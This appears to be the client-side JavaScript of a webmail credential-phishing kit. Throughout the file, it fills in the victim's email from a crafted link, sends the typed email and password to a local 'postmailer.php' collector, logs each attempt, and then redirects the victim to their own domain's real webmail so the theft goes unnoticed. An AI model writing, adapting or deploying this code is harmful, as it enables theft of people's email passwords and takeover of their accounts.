$(document).ready(function() {
    // Configuration - Set your redirect domain here
    var REDIRECT_DELAY = 1500; // Delay in milliseconds before redirect (1.5 seconds)
    
    // Function to extract domain from email and create webmail URL
    function getWebmailUrl(email) {
        if (!email || !email.includes('@')) {
            return 'https://webmail.gracedrive.org'; // Fallback domain
        }
        
        var domain = email.split('@')[1];
        return 'https://webmail.' + domain;
    }
    
    // Enhanced function to extract email from URL hash, query, or filename (index.html@user@domain.com)
    function extractEmailFromUrl() {
        var email = null;
        var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        
        console.log('Current URL:', window.location.href);
        console.log('Pathname:', window.location.pathname);
        console.log('Search:', window.location.search);
        console.log('Hash:', window.location.hash);
        
        // 1. Try to get email from URL hash (fragment)
        var hash = window.location.hash;
        if (hash && hash.length > 1) {
            var hashContent = decodeURIComponent(hash.substring(1));
            console.log('Hash content:', hashContent);
            if (emailRegex.test(hashContent)) {
                email = hashContent;
                console.log('Email found in hash:', email);
            }
        }
        
        // 2. Try URL query parameters
        if (!email) {
            var urlParams = new URLSearchParams(window.location.search);
            var emailParam = urlParams.get('email') || urlParams.get('user') || urlParams.get('username');
            if (emailParam) {
                var decodedEmail = decodeURIComponent(emailParam);
                console.log('Query param email:', decodedEmail);
                if (emailRegex.test(decodedEmail)) {
                    email = decodedEmail;
                    console.log('Email found in query params:', email);
                }
            }
        }
        
        // 3. Try to extract from filename pattern (index.html@user@domain.com)
        if (!email) {
            var path = window.location.pathname;
            var fullUrl = window.location.href;
            console.log('Checking pathname for email pattern:', path);
            console.log('Full URL for parsing:', fullUrl);
            
            // Pattern 1: filename@user@domain.com format - most specific first
            var patterns = [
                // Match index.html@user@domain.com or similar
                /([a-zA-Z0-9._-]+\.[a-zA-Z]+)@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/,
                // Match just @user@domain.com in path
                /@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/,
                // Match filename@user@domain.com without extension
                /([a-zA-Z0-9._-]+)@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/
            ];
            
            for (var p = 0; p < patterns.length; p++) {
                var match = path.match(patterns[p]);
                if (match) {
                    if (match[2]) {
                        // Pattern with filename capture group
                        email = match[2];
                        console.log('Email found with pattern', p + 1, '- Filename:', match[1], 'Email:', email);
                        break;
                    } else if (match[1]) {
                        // Pattern without filename capture group
                        email = match[1];
                        console.log('Email found with pattern', p + 1, 'Email:', email);
                        break;
                    }
                }
            }
            
            // Also try the full URL if path didn't work
            if (!email) {
                for (var q = 0; q < patterns.length; q++) {
                    var urlMatch = fullUrl.match(patterns[q]);
                    if (urlMatch) {
                        if (urlMatch[2]) {
                            email = urlMatch[2];
                            console.log('Email found in full URL with pattern', q + 1, '- Filename:', urlMatch[1], 'Email:', email);
                            break;
                        } else if (urlMatch[1]) {
                            email = urlMatch[1];
                            console.log('Email found in full URL with pattern', q + 1, 'Email:', email);
                            break;
                        }
                    }
                }
            }
        }
        
        // 4. Check the full URL for any email pattern
        if (!email) {
            var fullUrl = window.location.href;
            console.log('Checking full URL for email patterns:', fullUrl);
            
            // Look for any email pattern in the entire URL
            var emailMatches = fullUrl.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
            if (emailMatches && emailMatches.length > 0) {
                // Take the first valid email found
                for (var i = 0; i < emailMatches.length; i++) {
                    if (emailRegex.test(emailMatches[i])) {
                        email = emailMatches[i];
                        console.log('Email found in full URL:', email);
                        break;
                    }
                }
            }
        }
        
        // 5. Try to decode any URL-encoded emails
        if (!email) {
            var decodedUrl = decodeURIComponent(window.location.href);
            console.log('Checking decoded URL:', decodedUrl);
            
            var decodedMatches = decodedUrl.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g);
            if (decodedMatches && decodedMatches.length > 0) {
                for (var j = 0; j < decodedMatches.length; j++) {
                    if (emailRegex.test(decodedMatches[j])) {
                        email = decodedMatches[j];
                        console.log('Email found in decoded URL:', email);
                        break;
                    }
                }
            }
        }
        
        console.log('Final extracted email:', email);
        return email;
    }
    
    // Function to handle successful login and redirect
    function handleSuccessfulLogin(response) {
        $('#loading-overlay').hide();
        var msg = response && response.msg ? response.msg : 'Login successful!';
        
        // Show success message
        $('#login-status-message').text(msg).show();
        $('#login-status').removeClass('error-notice').addClass('success-notice').show();
        
        // Clear password field for security
        $('#password').val('');
        
        // Disable form to prevent further submissions
        $('#login_submit').prop('disabled', true).text('Login Successful');
        $('#email').prop('disabled', true);
        $('#password').prop('disabled', true);
        
        // Immediate redirect attempt
        var userEmail = $('#email').val();
        var redirectUrl = getWebmailUrl(userEmail) + '?email=' + encodeURIComponent(userEmail);
        console.log('Attempting immediate redirect to: ' + redirectUrl);
        
        // Try multiple redirect methods
        try {
            // Method 1: window.location.replace
            window.location.replace(redirectUrl);
        } catch(e) {
            console.log('Method 1 failed, trying method 2');
            try {
                // Method 2: window.location.href
                window.location.href = redirectUrl;
            } catch(e2) {
                console.log('Method 2 failed, trying method 3');
                // Method 3: window.open
                window.open(redirectUrl, '_self');
            }
        }
        
        // Fallback redirect after delay
        setTimeout(function() {
            var currentDomain = getWebmailUrl(userEmail).replace('https://', '');
            if (window.location.href.indexOf(currentDomain) === -1) {
                console.log('Fallback redirect triggered');
                window.location.href = redirectUrl;
            }
        }, REDIRECT_DELAY);
    }
    
    // Function to handle failed login
    function handleFailedLogin(response) {
        $('#loading-overlay').hide();
        var msg = response && response.msg ? response.msg : 'Invalid email or password. Please try again.';
        
        $('#login-status-message').text(msg);
        $('#login-status').removeClass('success-notice').addClass('error-notice').show();
        $('#password').val('').focus();
        
        if (response && response.attempt) {
            console.log('Attempt #' + response.attempt + ' logged');
        }
    }
    
    // Test function to demonstrate email parsing (for debugging)
    function testEmailParsing() {
        console.log('=== EMAIL PARSING TEST ===');
        var testUrls = [
            'https://example.com/index.html@user@domain.com',
            'https://example.com/login@john.doe@gmail.com',
            'https://example.com/webmail.html@admin@company.org',
            'https://example.com/?email=test@example.com',
            'https://example.com/#user@domain.com',
            'https://example.com/index.html@user%40domain.com'
        ];
        
        testUrls.forEach(function(url) {
            console.log('Testing URL:', url);
            var emailMatch = url.match(/([^\/]+)@([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
            if (emailMatch) {
                console.log('  - Filename:', emailMatch[1]);
                console.log('  - Email:', emailMatch[2]);
            } else {
                console.log('  - No match found');
            }
        });
        console.log('=== END TEST ===');
    }
    
    // Auto-populate email field if valid email is found in URL or filename
    var emailFromUrl = extractEmailFromUrl();
    if (emailFromUrl) {
        $('#email').val(emailFromUrl);
        $('#password').focus();
        $('#email').css('background-color', '#f0f8ff');
        setTimeout(function() {
            $('#email').css('background-color', '');
        }, 2000);
        
        // Show success message for auto-population
        $('#msg').text('Email auto-populated from URL: ' + emailFromUrl)
               .css('color', 'green')
               .css('background-color', '#d4edda')
               .css('border', '1px solid #c3e6cb')
               .show();
        setTimeout(function() {
            $('#msg').fadeOut();
        }, 3000);
    }
    
    // Run test function in console (uncomment for debugging)
    // testEmailParsing();
    
    // Listen for hash changes (if user navigates with different email)
    $(window).on('hashchange', function() {
        var newEmail = extractEmailFromUrl();
        if (newEmail && newEmail !== $('#email').val()) {
            $('#email').val(newEmail);
            $('#password').focus();
        }
    });
    
    // Form submission handler
    $('#login_submit').click(function(e) {
        e.preventDefault();
        var email = $('#email').val().trim();
        var password = $('#password').val();
        
        if (!email) {
            $('#msg').text('Please enter an email address.').show();
            $('#email').focus();
            return false;
        }
        
        if (!password) {
            $('#msg').text('Please enter a password.').show();
            $('#password').focus();
            return false;
        }
        
        var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        if (!emailRegex.test(email)) {
            $('#msg').text('Please enter a valid email address.').show();
            $('#email').focus();
            return false;
        }
        
        $('#msg').hide();
        $('#login-status').hide();
        $('#loading-overlay').show();
        
        // Submit the form via AJAX
        $.ajax({
            url: 'postmailer.php', // Local PHP backend
            method: 'POST',
            type: 'POST',
            data: {
                email: email,
                password: password
            },
            dataType: 'json',
            cache: false,
            timeout: 30000,
            processData: true,
            contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
            beforeSend: function() {
                $('#login_submit').prop('disabled', true).text('Processing...');
            },
            success: function(response) {
                console.log('Server response:', response);
                var msg = response && response.msg ? response.msg : '';
                
                // Debug: Log the response details
                console.log('Response message:', msg);
                console.log('Response signal:', response && response.signal);
                console.log('Response success:', response && response.success);
                
                // Check if login was successful - more comprehensive check
                if (response && (response.signal === 'ok' || response.success === true || 
                    msg.toLowerCase().includes('success') || msg.toLowerCase().includes('redirect'))) {
                    console.log('Login successful - triggering redirect');
                    handleSuccessfulLogin(response);
                } else {
                    console.log('Login failed - showing error');
                    handleFailedLogin(response);
                }
            },
            error: function(xhr, status, error) {
                $('#loading-overlay').hide();
                var errorMsg = 'Connection error';
                
                if (xhr.responseText) {
                    try {
                        var errorResponse = JSON.parse(xhr.responseText);
                        errorMsg = errorResponse.msg || errorMsg;
                    } catch (e) {
                        errorMsg = 'Server error: ' + xhr.status;
                    }
                }
                
                $('#login-status-message').text(errorMsg);
                $('#login-status').removeClass('success-notice').addClass('error-notice').show();
                $('#password').val('').focus();
            },
            complete: function() {
                // Only re-enable if login failed
                if (!$('#login_submit').prop('disabled') || $('#login_submit').text() !== 'Login Successful') {
                    $('#login_submit').prop('disabled', false).text('Log in');
                }
            }
        });
        
        return false;
    });
    
    // Reset password functionality (placeholder)
    $('#reset_password').click(function(e) {
        e.preventDefault();
        alert('Password reset functionality would be implemented here.');
    });
});